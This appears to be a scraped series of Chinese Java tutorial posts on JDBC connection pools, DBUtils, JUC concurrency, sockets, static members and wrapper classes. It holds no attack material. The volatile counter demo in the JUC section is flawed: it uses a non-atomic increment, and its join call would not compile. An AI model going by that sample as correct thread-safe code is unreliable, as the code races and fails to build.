八、数据库连接池 1. JDBC数据库连接池的必要性 在使用开发基于数据库的web程序时，传统的模式基本是按以下步骤：　在主程序（如servlet、beans）中建立数据库连接 进行sql操作 断开数据库连接 但是这种模式开发，存在以下问题:\n普通的JDBC数据库连接使用 DriverManager 来获取，每次向数据库建立连接的时候都要将 Connection 加载到内存中，再验证用户名和密码(得花费0.05s～1s的时间)。需要数据库连接的时候，就向数据库要求一个，执行完成后再断开连接。这样的方式将会消耗大量的资源和时间。**数据库的连接资源并没有得到很好的重复利用。**若同时有几百人甚至几千人在线，频繁的进行数据库连接操作将占用很多的系统资源，严重的甚至会造成服务器的崩溃； **对于每一次数据库连接，使用完后都得断开。**否则，如果程序出现异常而未能关闭，将会导致数据库系统中的内存泄漏，最终将导致重启数据库； 这种开发不能控制被创建的连接对象数，系统资源会被毫无顾及的分配出去，如连接过多，也可能导致内存泄漏，服务器崩溃。 2. 数据库连接池技术 为解决传统开发中的数据库连接问题，可以采用数据库连接池技术。\n数据库连接池的基本思想：就是为数据库连接建立一个“缓冲池”。预先在缓冲池中放入一定数量的连接，当需要建立数据库连接时，只需从“缓冲池”中取出一个，使用完毕之后再放回去。\n数据库连接池负责分配、管理和释放数据库连接，它允许应用程序重复使用一个现有的数据库连接，而不是重新建立一个。数据库连接池在初始化时将创建一定数量的数据库连接放到连接池中，这些数据库连接的数量是由最小数据库连接数来设定的。无论这些数据库连接是否被使用，连接池都将一直保证至少拥有这么多的连接数量。连接池的最大数据库连接数量限定了这个连接池能占有的最大连接数，当应用程序向连接池请求的连接数超过最大连接数量时，这些请求将被加入到等待队列中。\n数据库连接池工作原理： 数据库连接池技术的优点\n1. 资源重用\n由于数据库连接得以重用，避免了频繁创建，释放连接引起的大量性能开销。在减少系统消耗的基础上，另一方面也增加了系统运行环境的平稳性。\n2. 更快的系统反应速度\n数据库连接池在初始化过程中，往往已经创建了若干数据库连接置于连接池中备用。此时连接的初始化工作均已完成。对于业务请求处理而言，直接利用现有可用连接，避免了数据库连接初始化和释放过程的时间开销，从而减少了系统的响应时间。\n3. 新的资源分配手段\n对于多应用共享同一数据库的系统而言，可在应用层通过数据库连接池的配置，实现某一应用最大可用数据库连接数的限制，避免某一应用独占所有的数据库资源。\n4. 统一的连接管理，避免数据库连接泄漏\n在较为完善的数据库连接池实现中，可根据预先的占用超时设定，强制回收被占用连接，从而避免了常规数据库连接操作中可能出现的资源泄露。\n3. 开源数据库连接池 JDBC 的数据库连接池使用 javax.sql.DataSource 来表示，DataSource 只是一个接口，该接口通常由服务器(Weblogic, WebSphere, Tomcat)提供实现，也有一些开源组织提供实现：\nDBCP：是Apache提供的数据库连接池。tomcat 服务器自带dbcp数据库连接池。速度相对c3p0较快，但因自身存在 BUG，Hibernate3 已不再提供支持。\nC3P0：是一个开源组织提供的一个数据库连接池，**速度相对较慢，稳定性还可以。**hibernate 官方推荐使用；\nProxool：是sourceforge下的一个开源项目数据库连接池，有监控连接池状态的功能，稳定性较c3p0差一点；\nBoneCP：是一个开源组织提供的数据库连接池，速度快；\nDruid：是阿里提供的数据库连接池，据说是集DBCP 、C3P0 、Proxool 优点于一身的数据库连接池，但是速度不确定是否有 BoneCP 快；\nDataSource：通常被称为数据源，它包含连接池和连接池管理两个部分，习惯上也经常把 DataSource 称为连接池。DataSource用来取代DriverManager来获取Connection，获取速度快，同时可以大幅度提高数据库访问速度。\n注意：数据源和数据库连接不同，数据源无需创建多个，它是产生数据库连接的工厂，因此**整个应用只需要一个数据源即可。**当数据库访问结束后，程序还是像以前一样关闭数据库连接：conn.close(); 但conn.close()并没有关闭数据库的物理连接，它仅仅把数据库连接释放，归还给了数据库连接池。\n（1）C3P0数据库连接池 配置文件为：c3p0-config.xml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;c3p0-config\u0026gt; \u0026lt;named-config name=\u0026#34;helloc3p0\u0026#34;\u0026gt; \u0026lt;!-- 获取连接的4个基本信息 --\u0026gt; \u0026lt;property name=\u0026#34;user\u0026#34;\u0026gt;root\u0026lt;/property\u0026gt; \u0026lt;property name=\u0026#34;password\u0026#34;\u0026gt;abc123\u0026lt;/property\u0026gt; \u0026lt;property name=\u0026#34;jdbcUrl\u0026#34;\u0026gt;jdbc:mysql:///test\u0026lt;/property\u0026gt; \u0026lt;property name=\u0026#34;driverClass\u0026#34;\u0026gt;com.mysql.jdbc.Driver\u0026lt;/property\u0026gt; \u0026lt;!-- 涉及到数据库连接池的管理的相关属性的设置 --\u0026gt; \u0026lt;!-- 若数据库中连接数不足时, 一次向数据库服务器申请多少个连接 --\u0026gt; \u0026lt;property name=\u0026#34;acquireIncrement\u0026#34;\u0026gt;5\u0026lt;/property\u0026gt; \u0026lt;!-- 初始化数据库连接池时连接的数量 --\u0026gt; \u0026lt;property name=\u0026#34;initialPoolSize\u0026#34;\u0026gt;5\u0026lt;/property\u0026gt; \u0026lt;!-- 数据库连接池中的最小的数据库连接数 --\u0026gt; \u0026lt;property name=\u0026#34;minPoolSize\u0026#34;\u0026gt;5\u0026lt;/property\u0026gt; \u0026lt;!-- 数据库连接池中的最大的数据库连接数 --\u0026gt; \u0026lt;property name=\u0026#34;maxPoolSize\u0026#34;\u0026gt;10\u0026lt;/property\u0026gt; \u0026lt;!-- C3P0 数据库连接池可以维护的 Statement 的个数 --\u0026gt; \u0026lt;property name=\u0026#34;maxStatements\u0026#34;\u0026gt;20\u0026lt;/property\u0026gt; \u0026lt;!-- 每个连接同时可以使用的 Statement 对象的个数 --\u0026gt; \u0026lt;property name=\u0026#34;maxStatementsPerConnection\u0026#34;\u0026gt;5\u0026lt;/property\u0026gt; \u0026lt;/named-config\u0026gt; \u0026lt;/c3p0-config\u0026gt; 获取连接：\n1 2 3 4 5 6 7 8 9 import com.mchange.v2.c3p0.ComboPooledDataSource; public class Demo { public static void main(String[] args) throws Exception { DataSource cpds = new ComboPooledDataSource(\u0026#34;helloc3p0\u0026#34;); Connection conn = cpds.getConnection(); System.out.println(conn); } } （2）DBCP数据库连接池 DBCP 是 Apache 软件基金组织下的开源连接池实现，该连接池依赖该组织下的另一个开源系统：Common-pool。如需使用该连接池实现，应在系统中增加如下两个 jar 文件：\nCommons-dbcp.jar：连接池的实现 Commons-pool.jar：连接池实现的依赖库 配置属性说明\n属性 默认值 说明 initialSize 0 连接池启动时创建的初始化连接数量 maxActive 8 连接池中可同时连接的最大的连接数 maxIdle 8 连接池中最大的空闲的连接数，超过的空闲连接将被释放，如果设置为负数表示不限制 minIdle 0 连接池中最小的空闲的连接数，低于这个数量会被创建新的连接。该参数越接近maxIdle，性能越好，因为连接的创建和销毁，都是需要消耗资源的；但是不能太大。 maxWait 无限制 最大等待时间，当没有可用连接时，连接池等待连接释放的最大时间，超过该时间限制会抛出异常，如果设置-1表示无限等待 poolPreparedStatements false 开启池的Statement是否prepared maxOpenPreparedStatements 无限制 开启池的prepared 后的同时最大连接数 minEvictableIdleTimeMillis 连接池中连接，在时间段内一直空闲， 被逐出连接池的时间 removeAbandonedTimeout 300 超过时间限制，回收没有用(废弃)的连接 removeAbandoned false 超过removeAbandonedTimeout时间后，是否进 行没用连接（废弃）的回收 配置文件为：dbcp.properties\n1 2 3 4 5 6 7 driverClassName=com.mysql.jdbc.Driver url=jdbc:mysql://localhost:3306/test?rewriteBatchedStatements=true\u0026amp;useServerPrepStmts=false username=root password=abc123 initialSize=10 #... 获取连接：\n1 2 3 4 5 6 7 8 9 10 11 12 13 import org.apache.commons.dbcp.BasicDataSourceFactory; public class Demo { public static void main(String[] args) throws Exception { DataSource source = null; Properties properties = new Properties(); InputStream is = Demo.class.getClassLoader().getResourceAsStream(\u0026#34;dbcp.properties\u0026#34;); properties.load(is); source = BasicDataSourceFactory.createDataSource(properties); Connection conn = source.getConnection(); System.out.println(conn); } } （3）Druid（德鲁伊）数据库连接池 Druid 是阿里巴巴开源平台上一个数据库连接池实现，它结合了C3P0、DBCP、Proxool等DB池的优点，同时加入了日志监控，可以很好的监控DB池连接和SQL的执行情况，可以说是针对监控而生的DB连接池，可以说是目前最好的连接池之一。\n详细配置参数： 配置 缺省 说明 name 配置这个属性的意义在于，如果存在多个数据源，监控的时候可以通过名字来区分开来。 如果没有配置，将会生成一个名字，格式是：”DataSource-” + System.identityHashCode(this) url 连接数据库的url，不同数据库不一样。例如：mysql : jdbc:mysql://10.20.153.104:3306/druid2 oracle : jdbc:oracle:thin:@10.20.149.85:1521:ocnauto username 连接数据库的用户名 password 连接数据库的密码。如果你不希望密码直接写在配置文件中，可以使用ConfigFilter。详细看这里：https://github.com/alibaba/druid/wiki/%E4%BD%BF%E7%94%A8ConfigFilter driverClassName 根据url自动识别 这一项可配可不配，如果不配置druid会根据url自动识别dbType，然后选择相应的driverClassName(建议配置下) initialSize 0 初始化时建立物理连接的个数。初始化发生在显示调用init方法，或者第一次getConnection时 maxActive 8 最大连接池数量 maxIdle 8 已经不再使用，配置了也没效果 minIdle 最小连接池数量 maxWait 获取连接时最大等待时间，单位毫秒。配置了maxWait之后，缺省启用公平锁，并发效率会有所下降，如果需要可以通过配置useUnfairLock属性为true使用非公平锁。 poolPreparedStatements false 是否缓存preparedStatement，也就是PSCache。PSCache对支持游标的数据库性能提升巨大，比如说oracle。在mysql下建议关闭。 maxOpenPreparedStatements -1 要启用PSCache，必须配置大于0，当大于0时，poolPreparedStatements自动触发修改为true。在Druid中，不会存在Oracle下PSCache占用内存过多的问题，可以把这个数值配置大一些，比如说100 validationQuery 用来检测连接是否有效的sql，要求是一个查询语句。如果validationQuery为null，testOnBorrow、testOnReturn、testWhileIdle都不会其作用。 testOnBorrow true 申请连接时执行validationQuery检测连接是否有效，做了这个配置会降低性能。 testOnReturn false 归还连接时执行validationQuery检测连接是否有效，做了这个配置会降低性能 testWhileIdle false 建议配置为true，不影响性能，并且保证安全性。申请连接的时候检测，如果空闲时间大于timeBetweenEvictionRunsMillis，执行validationQuery检测连接是否有效。 timeBetweenEvictionRunsMillis 有两个含义： 1)Destroy线程会检测连接的间隔时间2)testWhileIdle的判断依据，详细看testWhileIdle属性的说明 numTestsPerEvictionRun 不再使用，一个DruidDataSource只支持一个EvictionRun minEvictableIdleTimeMillis connectionInitSqls 物理连接初始化的时候执行的sql exceptionSorter 根据dbType自动识别 当数据库抛出一些不可恢复的异常时，抛弃连接 filters 属性类型是字符串，通过别名的方式配置扩展插件，常用的插件有： 监控统计用的filter:stat日志用的filter:log4j防御sql注入的filter:wall proxyFilters 类型是List，如果同时配置了filters和proxyFilters，是组合关系，并非替换关 配置文件为：druid.properties\n1 2 3 4 5 6 7 8 9 url=jdbc:mysql://localhost:3306/test?rewriteBatchedStatements=true username=root password=123456 driverClassName=com.mysql.jdbc.Driver initialSize=10 maxActive=20 maxWait=1000 filters=wall 获取连接：\n1 2 3 4 5 6 7 8 9 10 11 12 import com.alibaba.druid.pool.DruidDataSourceFactory; public class Demo { public static void main(String[] args) throws Exception { DataSource source = null; Properties properties = new Properties(); properties.load(Demo.class.getClassLoader().getResourceAsStream(\u0026#34;druid.properties\u0026#34;)); source = DruidDataSourceFactory.createDataSource(properties); Connection conn = source.getConnection(); System.out.println(conn); } } 九、Apache-DBUtils实现CRUD操作 1. Apache-DBUtils简介 commons-dbutils是 Apache 组织提供的一个开源 JDBC工具类库，它是对JDBC的简单封装，学习成本极低，并且使用dbutils能极大简化jdbc编码的工作量，同时也不会影响程序的性能。\nAPI介绍： org.apache.commons.dbutils.QueryRunner org.apache.commons.dbutils.ResultSetHandler 工具类：org.apache.commons.dbutils.DbUtils 2. 主要API的使用 （1） DbUtils DbUtils ：提供如关闭连接、装载JDBC驱动程序等常规工作的工具类，里面的所有方法都是静态的。主要方法如下：\npublic static void close(…) throws java.sql.SQLException：DbUtils类提供了三个重载的关闭方法。这些方法检查所提供的参数是不是NULL，如果不是的话，它们就关闭Connection、Statement和ResultSet。 public static void closeQuietly(…): 这一类方法不仅能在Connection、Statement和ResultSet为NULL情况下避免关闭，还能隐藏一些在程序中抛出的SQLEeception。 public static void commitAndClose(Connection conn)throws SQLException：用来提交连接的事务，然后关闭连接 public static void commitAndCloseQuietly(Connection conn)：用来提交连接，然后关闭连接，并且在关闭连接时不抛出SQL异常。 public static void rollback(Connection conn)throws SQLException：允许conn为null，因为方法内部做了判断 public static void rollbackAndClose(Connection conn)throws SQLException rollbackAndCloseQuietly(Connection) public static boolean loadDriver(java.lang.String driverClassName)：这一方装载并注册JDBC驱动程序，如果成功就返回true。使用该方法，你不需要捕捉这个异常ClassNotFoundException。 （2）QueryRunner类 该类简单化了SQL查询，它与ResultSetHandler组合在一起使用可以完成大部分的数据库操作，能够大大减少编码量。\nQueryRunner类提供了两个构造器：\n默认的构造器 需要一个 javax.sql.DataSource 来作参数的构造器 QueryRunner类的主要方法：\n更新 public int update(Connection conn, String sql, Object... params) throws SQLException：用来执行一个更新（插入、更新或删除）操作。 插入 public \u0026lt;T\u0026gt; T insert(Connection conn,String sql,ResultSetHandler\u0026lt;T\u0026gt; rsh, Object... params) throws SQLException：只支持INSERT语句，其中 rsh - The handler used to create the result object from the ResultSet of auto-generated keys. 返回值: An object generated by the handler.即自动生成的键值 批处理 public int[] batch(Connection conn,String sql,Object[][] params)throws SQLException： INSERT, UPDATE, or DELETE语句 public \u0026lt;T\u0026gt; T insertBatch(Connection conn,String sql,ResultSetHandler\u0026lt;T\u0026gt; rsh,Object[][] params)throws SQLException：只支持INSERT语句 查询 public Object query(Connection conn, String sql, ResultSetHandler rsh,Object... params) throws SQLException：执行一个查询操作，在这个查询中，对象数组中的每个元素值被用来作为查询语句的置换参数。该方法会自行处理 PreparedStatement 和 ResultSet 的创建和关闭。 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AFjdbc/","title":"Java学习之路——JDBC"},{"content":"Java学习之路——JUC 一、JUC 简介 在 Java 5.0 提供了 java.util.concurrent（简称 JUC ）包，在此包中增加了在并发编程中很常用 的实用工具类，用于定义类似于线程的自定义子 系统，包括线程池、异步 IO 和轻量级任务框架。 提供可调的、灵活的线程池。还提供了设计用于 多线程上下文中的 Collection 实现等。\n二、volatile 关键字 内存可见性（Memory Visibility）是指当某个线程正在使用对象状态 而另一个线程在同时修改该状态，需要确保当一个线程修改了对象 状态后，其他线程能够看到发生的状态变化。\n可见性错误是指当读操作与写操作在不同的线程中执行时，我们无法确保执行读操作的线程能适时地看到其他线程写入的值，有时甚至是根本不可能的事情。\n我们可以通过同步来保证对象被安全地发布。除此之外我们也可以使用一种更加轻量级的 volatile 变量。\nvolatile 关键字为域变量的访问提供了一种免锁机制，它保证了不同线程对这个变量进行操作时的可见性，即一个线程修改了某个变量的值，这新值对其他线程来说是立即可见的。\n示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 public class Demo { public static void main(String[] args) { // 创建两个线程，都对 x 进行操作 MyThread1 t1 = new MyThread1(); MyThread2 t2 = new MyThread2(); t1.start(); t2.start(); t1.join(); System.out.println(Counter.count); } } class Counter { // volatile 修饰 count 属性 static volatile int count = 0; public static void add() { count += 1; } } class MyThread1 extends Thread { @Override public void run() { for (int i=0 ; i\u0026lt;1000 ; i++) { Counter.add(); } } } class MyThread2 extends Thread { @Override public void run() { for (int i=0 ; i\u0026lt;1000 ; i++) { Counter.add(); } } } 三、CAS算法和原子变量 CAS 算法 CAS (Compare-And-Swap) 是一种硬件对并发的支持，针对多处理器 操作而设计的处理器中的一种特殊指令，用于管理对共享数据的并 发访问。\nCAS 是一种无锁的非阻塞算法的实现。\nCAS 包含了 3 个操作数：\n需要读写的内存值 V ； 进行比较的值 A ； 拟写入的新值 B 。 当且仅当 V 的值等于 A 时，CAS 通过原子方式用新值 B 来更新 V 的 值，否则不会执行任何操作。\n原子变量 原子变量类 比锁的粒度更细，更轻量级，并且对于在多处理器系统上实现高性能的并发代码来说是非常关键的。原子变量将发生竞争的范围缩小到单个变量上。\n原子变量类相当于一种泛化的 volatile 变量，能够支持原子的、有条件的读/改/写操作。\n原子类在内部使用 CAS 指令（基于硬件的支持）来实现同步。这些指令通常比锁更快。\n原子变量类可以分为 4 组：\n基本类型 AtomicBoolean：布尔类型原子类 AtomicInteger：整型原子类 AtomicLong：长整型原子类 引用类型 AtomicReference：引用类型原子类 AtomicMarkableReference：带有标记位的引用类型原子类 AtomicStampedReference：带有版本号的引用类型原子类 数组类型 AtomicIntegerArray：整形数组原子类 AtomicLongArray：长整型数组原子类 AtomicReferenceArray：引用类型数组原子类 属性更新器类型 AtomicIntegerFieldUpdater：整型字段的原子更新器。 AtomicLongFieldUpdater：长整型字段的原子更新器。 AtomicReferenceFieldUpdater：原子更新引用类型里的字段。 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 import java.util.concurrent.atomic.AtomicInteger; public class DemoTest { public static void main(String[] args) { AtomicDemo ad = new AtomicDemo(); for (int i=0 ; i\u0026lt;10 ; i++) { new Thread(ad).start(); } } } class AtomicDemo implements Runnable { private AtomicInteger serialNumber = new AtomicInteger(1); @Override public void run() { try { Thread.sleep(10); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(serialNumber.getAndIncrement()); } } 四、ConcurrentHashMap 锁分段机制 Java 5.0 在 java.util.concurrent 包中提供了多种并发容器类来改进同步容器 的性能。\nConcurrentHashMap 同步容器类是Java 5 增加的一个线程安全的哈希表。对与多线程的操作，介于 HashMap 与 Hashtable 之间。内部采用“锁分段” 机制替代 Hashtable 的独占锁。进而提高性能。\n此包还提供了设计用于多线程上下文中的 Collection 实现：ConcurrentHashMap、ConcurrentSkipListMap、ConcurrentSkipListSet、 CopyOnWriteArrayList 和 CopyOnWriteArraySet。\n当期望许多线程访问一个给 定 collection 时，ConcurrentHashMap 通常优于同步的 HashMap， ConcurrentSkipListMap 通常优于同步的 TreeMap。当期望的读数和遍历远远 大于列表的更新数时，CopyOnWriteArrayList 优于同步的 ArrayList。\nConcurrentHashMap 的结构:\nConcurrentHashMap由Segment数组结构和HashEntry数组结构组成；Segment是一种可重入锁（ReentrantLock），HashEntry用于存储键值对数据；一个ConcurrentHashMap包含一个由若干个Segment对象组成的数组，每个Segment对象守护整个散列映射表的若干个桶，每个桶是由若干个HashEntry对象链接起来的链表，table是一个由HashEntry对象组成的数组，table数组的每一个数组成员就是散列映射表的一个桶。\n五、CountDownLatch 闭锁 Java 5.0 在 java.util.concurrent 包中提供了多种并发容器类来改进同步容器 的性能。\nCountDownLatch 一个同步辅助类，在完成一组正在其他线程中执行的操作 之前，它允许一个或多个线程一直等待。\n闭锁可以延迟线程的进度直到其到达终止状态，闭锁可以用来确保某些活动直到其他活动都完成才继续执行：\n确保某个计算在其需要的所有资源都被初始化之后才继续执行; 确保某个服务在其依赖的所有其他服务都已经启动之后才启动; 等待直到某个操作所有参与者都准备就绪再继续执行。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 import java.util.concurrent.CountDownLatch; public class DemoTest { public static void main(String[] args) throws InterruptedException { long start = System.currentTimeMillis(); CountDownLatch latch = new CountDownLatch(10); CountDownLatchDemo demo = new CountDownLatchDemo(latch); for (int i=0 ; i\u0026lt;10 ; i++) { new Thread(demo).start(); } latch.await(); long end = System.currentTimeMillis(); System.out.println(\u0026#34;运行时间：\u0026#34; + (end - start)); } } class CountDownLatchDemo implements Runnable { private CountDownLatch latch; public CountDownLatchDemo(CountDownLatch latch) { this.latch = latch; } @Override public void run() { try { for (int i = 0; i \u0026lt; 1000; i++) { System.out.println(i); } latch.countDown(); } catch (Exception e) { e.printStackTrace(); } } } 六、Callable 接口 Java 5.0 在java.util.concurrent提供了一个新的创建执行 线程的方式：Callable 接口 。\nCallable 接口类似于 Runnable，两者都是为那些其实例可 能被另一个线程执行的类设计的。但是 Runnable 不会返 回结果，并且无法抛出经过检查的异常。 Callable 需要依赖FutureTask ，FutureTask 也可以用作闭锁。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AFjuc/","title":"Java学习之路——JUC"},{"content":"Java学习之路——Object 类的使用 简介 在 Java 程序中，如果我们没有明确指定类的父类，那么所有的类都继承自 Object 类（class java.lang.Object）。\n我们可以用下面的程序验证是否继承自 Object 类：\n1 2 3 4 5 6 7 8 9 public class Demo { public static void main(String[] args) { Person p = new Person(); System.out.println(p.getClass().getSuperclass()); } } class Person { } Object 类的官方文档\n1. clone() 作用：Creates and returns a copy of this object.\n例子：\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AFobject-%E7%B1%BB%E7%9A%84%E4%BD%BF%E7%94%A8/","title":"Java学习之路——Object 类的使用"},{"content":"Java学习之路——Socket编程 概述 所谓套接字(Socket)，就是对网络中不同主机上的应用进程之间进行双向通信的端点的抽象。一个套接字就是网络上进程通信的一端，提供了应用层进程利用网络协议交换数据的机制。从所处的地位来讲，套接字上联应用进程，下联网络协议栈，是应用程序通过网络协议进行通信的接口，是应用程序与网络协议根进行交互的接口。\nSocket是一个抽象概念，一个应用程序通过一个 Socket 来建立一个远程连接，而 Socket 内部通过 TCP/IP 协议把数据传输到网络。\nSocket、TCP 和部分 IP 的功能都是由操作系统提供的，不同的编程语言只是提供了对操作系统调用的简单的封装。\n关于计算机网络部分的知识这里不再赘述，本篇博客只是简单介绍在 Java 语言中 Socket 的使用 API。具体的使用细则可以参考其它资料。\n一、ServerSocket 类 服务器应用程序通过使用 java.net.ServerSocket 类以获取一个端口,并且侦听客户端请求。\n构造方法 构造方法 功能描述 ServerSocket(int port) 创建绑定到特定端口的服务器套接字； ServerSocket(int port, int backlog) 利用指定的 backlog 创建服务器套接字并将其绑定到指定的本地端口号； ServerSocket(int port, int backlog, InetAddress address) 使用指定的端口、侦听 backlog 和要绑定到的本地 IP 地址创建服务器； ServerSocket() 创建非绑定服务器套接字。 常用方法 方法 功能描述 int getLocalPort() 返回此套接字在其上侦听的端口； Socket accept() 侦听并接受到此套接字的连接； setSoTimeout(int timeout) 通过指定超时值启用/禁用 SO_TIMEOUT，以毫秒为单位； bind(SocketAddress host, int backlog) 将 ServerSocket 绑定到特定地址（IP 地址和端口号）。 二、Socket 类 ava.net.Socket 类代表客户端和服务器都用来互相沟通的套接字。客户端要获取一个 Socket 对象通过实例化 ，而 服务器获得一个 Socket 对象则通过 accept() 方法的返回值。\n构造方法 构造方法 功能描述 Socket(String host, int port) 创建一个流套接字并将其连接到指定主机上的指定端口号； Socket(InetAddress host, int port) 创建一个流套接字并将其连接到指定 IP 地址的指定端口号； Socket(String host, int port, InetAddress localAddress, int localPort) 创建一个套接字并将其连接到指定远程主机上的指定远程端口； Socket(InetAddress host, int port, InetAddress localAddress, int localPort) 创建一个套接字并将其连接到指定远程地址上的指定远程端口； Socket() 通过系统默认类型的 SocketImpl 创建未连接套接字 常用方法 方法 功能描述 connect(SocketAddress host, int timeout) 将此套接字连接到服务器，并指定一个超时值； InetAddress getInetAddress() 返回套接字连接的地址； getPort() 返回此套接字连接到的远程端口； getLocalPort() 返回此套接字绑定到的本地端口； SocketAddress getRemoteSocketAddress() 返回此套接字连接的端点的地址，如果未连接则返回 null； InputStream getInputStream() 返回此套接字的输入流； OutputStream getOutputStream() 返回此套接字的输出流； close() 关闭此套接字。 三、InetAddress 类 这个类表示互联网协议(IP)地址。\n常用方法 方法 功能描述 InetAddress getByAddress(byte[] addr) 在给定原始 IP 地址的情况下，返回 InetAddress 对象； InetAddress getByAddress(String host, byte[] addr) 根据提供的主机名和 IP 地址创建InetAddress； InetAddress getByName(String host) 在给定主机名的情况下确定主机的 IP 地址； getHostAddress() 返回 IP 地址字符串（以文本表现形式）； getHostName() 获取此 IP 地址的主机名； InetAddress getLocalHost() 返回本地主机； toString() 将此 IP 地址转换为 String。 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AFsocket%E7%BC%96%E7%A8%8B/","title":"Java学习之路——Socket编程"},{"content":"Java学习之路——static 关键字的使用 概述 static 是 Java 程序种的静态修饰符，什么叫静态修饰符呢？\n大家都知道，在程序中任何变量或者代码都是在编译时由系统自动分配内存来存储的，而所谓静态就是指在编译后所分配的内存会一直存在，直到程序运行结束退出内存才会释放这个空间。也就是只要程序在运行，那么这块内存就会一直存在。\nstatic 表示“全局”或者“静态”的意思，用来修饰成员变量和成员方法，也可以形成静态static代码块，但是Java语言中没有全局变量的概念。\n一、static 属性 按照是否静态的对类成员变量进行分类可分两种：\n一种是被static修饰的变量，叫静态变量或类变量； 另一种是没有被static修饰的变量，叫实例变量。 两者的区别有：\nJVM只为静态分配一次内存，静态变量在内存中只有一个拷贝（节省内存）； 在加载类的过程中完成静态变量的内存分配； 静态变量的加载先于实例的加载； 每创建一个实例，就会为实例变量分配一次内存，实例之间实例变量互不影响； 使用时机：一般情况下，我们将从属于一个类，不会随着实例对象改变的变量设置为静态变量。\n访问权限\n调用对象 类属性 实例属性 类 ✓ ✘ 实例对象 ✓ ✓ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 public class Demo { public static void main(String[] args) { // 直接通过 Man 类调用 gender 属性 System.out.println(Man.gender); // 实例属性 Man m1 = new Man(); m1.name = \u0026#34;张三\u0026#34;; Man m2 = new Man(); m2.name = \u0026#34;李四\u0026#34;; System.out.println(m1.name); System.out.println(m2.name); // 通过实例对象调用 gender 属性 System.out.println(m1.gender); // 通过 m1 修改了类属性，那么 m2 输出的类属性也会变化 m1.gender = \u0026#34;女\u0026#34;; System.out.println(m2.gender); } } class Man { String name; static String gender=\u0026#34;男\u0026#34;; } 二、static 方法 静态方法可以直接通过类名调用，任何的实例也都可以调用。\n因此静态方法中不能用 this 和 super 关键字，不能直接访问所属类的实例变量和实例方法(就是不带static的成员变量和成员成员方法)，只能访问所属类的静态成员变量和成员方法。因为实例成员与特定的对象关联！\n因为static方法独立于任何实例，因此static方法必须被实现，而不能是抽象的abstract。\n使用时机：一般情况下，我们将修改类属性的方法和工具类的方法设置为类方法。\n调用权限\n调用对象 类方法 实例方法 类 ✓ ✘ 实例对象 ✓ ✓ 三、static 代码块 static 代码块也叫静态代码块，是在类中独立于类成员的static语句块，可以有多个，位置可以随便放，它不在任何的方法体内。普通的代码块是创建实例时运行的，在里面可以访问类属性和方法，也可以访问实例属性与方法。\nJVM加载类时会执行这些静态的代码块，如果 static 代码块有多个，JVM将按照它们在类中出现的先后顺序依次执行它们，每个代码块只会被执行一次。\n对象 访问类属性和类方法 访问实例属性和实例方法 static 代码块 ✓ ✘ 普通代码块 ✓ ✓ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 public class Demo { static { System.out.println(\u0026#34;Hello!\u0026#34;); } public static void main(String[] args) { System.out.println(new Man());; } static { System.out.println(\u0026#34;Bye!\u0026#34;); } } class Man { { System.out.println(\u0026#34;Nice to meet you.\u0026#34;); System.out.println(this.getClass()); } } // Hello! // Bye! // Nice to meet you. // class Man 通过上面的例子我们可以发现 static 代码块是按照顺序最先自动执行的。\n如果需要通过计算来初始化 static 变量，我们可以通过声明一个 static 代码块进行处理，static 块仅在该类被加载时执行一次。如果我们需要在创建实例时对实例对象进行操作，那么我们可以用普通代码块。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AFstatic-%E5%85%B3%E9%94%AE%E5%AD%97%E7%9A%84%E4%BD%BF%E7%94%A8/","title":"Java学习之路——static 关键字的使用"},{"content":"Java学习之路——包装类 简介 Java 中的数据类型 int，double 等不是对象，无法通过向上转型获取到 Object 提供的方法。基本数据类型由于这样的特性，导致无法参与转型，泛型，反射等过程。为了弥补这个缺陷，Java 提供了包装类。\nJava 中的 8 种基本数据类型都有与之对应的包装类：\n基本数据类型 包装类 byte Byte short Short int Integer long Long float Float double Double char Character boolean Boolean 一、基本数据类型和包装类的区别 定义不同：包装类属于对象，基本数据类型不是； 声明和使用方式不同：包装类使用new初始化，有些集合类的定义不能使用基本数据类型，例如 ArrayList； 初始值不同。包装类默认值为null，基本数据类型则不同的类型不一样（具体见上表）； 存储方式和位置不同，从而性能不同。基本数据类型存储在栈（stack）中，包装类则分成引用和实例，引用在栈（stack）中，具体实例在堆（heap）中。 二、拆箱/装箱 拆箱/装箱实际上就是基本类型和包装类的相互转换。\n由基本类型向对应的包装类转换称为装箱，例如把 int 包装成 Integer 类的对象：\n1 2 Integer i = Integer.valueOf(1); //手动装箱 Integer j = 1; //自动装箱 包装类向对应的基本类型转换称为拆箱，例如把 Integer 类的对象重新简化为 int：\n1 2 3 Integer i0 = new Integer(1); int i1 = i0; //自动拆箱 int i2 = i0.intValue(); //手动拆箱 三、基本数据类型、包装类与 String 相互转换 基本数据类型和包装类转字符串：\n1 2 3 4 5 6 // 1. 连接运算 String str1 = 1 + \u0026#34;\u0026#34;; String str2 = new Integer(1) + \u0026#34;\u0026#34;; // 2. 调用 String.valueOf()方法 String str3 = String.valueOf(1); String str4 = String.valueOf(new Integer(1)); 字符串转基本数据类型和包装类：\n1 